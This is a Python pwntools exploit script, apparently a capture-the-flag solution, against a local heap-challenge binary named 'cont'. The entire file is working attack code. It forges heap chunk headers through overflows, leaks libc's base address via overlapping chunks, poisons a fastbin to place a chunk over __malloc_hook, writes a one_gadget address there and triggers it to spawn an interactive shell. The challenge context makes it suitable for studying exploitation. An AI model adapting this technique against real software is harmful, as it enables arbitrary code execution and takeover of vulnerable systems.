from pwn import *
def setname(c):
	p.sendafter("What's user name: ",c)
def setpass(c):
	p.sendafter("Password: ",c)
def cmd(c):
	p.sendlineafter(">> ",str(c))
def magic(idx,l,c):
	cmd(1)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Length: ",str(l))
	p.sendafter("though\n",c)
def add(idx,l,c):
	cmd(1)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Length: ",str(l))
	p.sendafter("Message: ",c)
def show(idx):
	cmd(3)
	p.sendlineafter("Index: ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter("Index: ",str(idx))
def edit(c):
	p.sendlineafter("Edit message: ",c)

context.log_level="debug"
p=process("./cont")
setname("nier")
p.readuntil("Do you wanna set password? (y/n) ")
p.sendline("y")
setpass("A"*0x10+p64(0)+p64(0x31))
add(0,0x20,"A")
add(1,0x20,"A")
free(0)
magic(0,0x100,"A"*0x20+p64(0)+p64(0x91))
add(2,0x20,"A")
add(3,0x20,"A")
add(4,0x20,"A")
free(1)
add(1,0x20,"A")
show(2)
p.readuntil("View Message: ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x00007ffff7a0d000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address=base
free(4)
free(3)
free(2)
magic(3,0x100,"A"*0x20+p64(0)+p64(0x31)+p64(0x602a50))
magic(4,0x200,p64(0x0000002000000020)*2+p64(0x000000000000020)+p64(libc.symbols['__malloc_hook']))
one=base+0xf02a4
magic(2,0x200,p64(0x200)*4+p64(libc.symbols['__malloc_hook']))
cmd(2)
p.sendline(p64(one))
#gdb.attach(p)
free(2)
p.interactive("nier>")
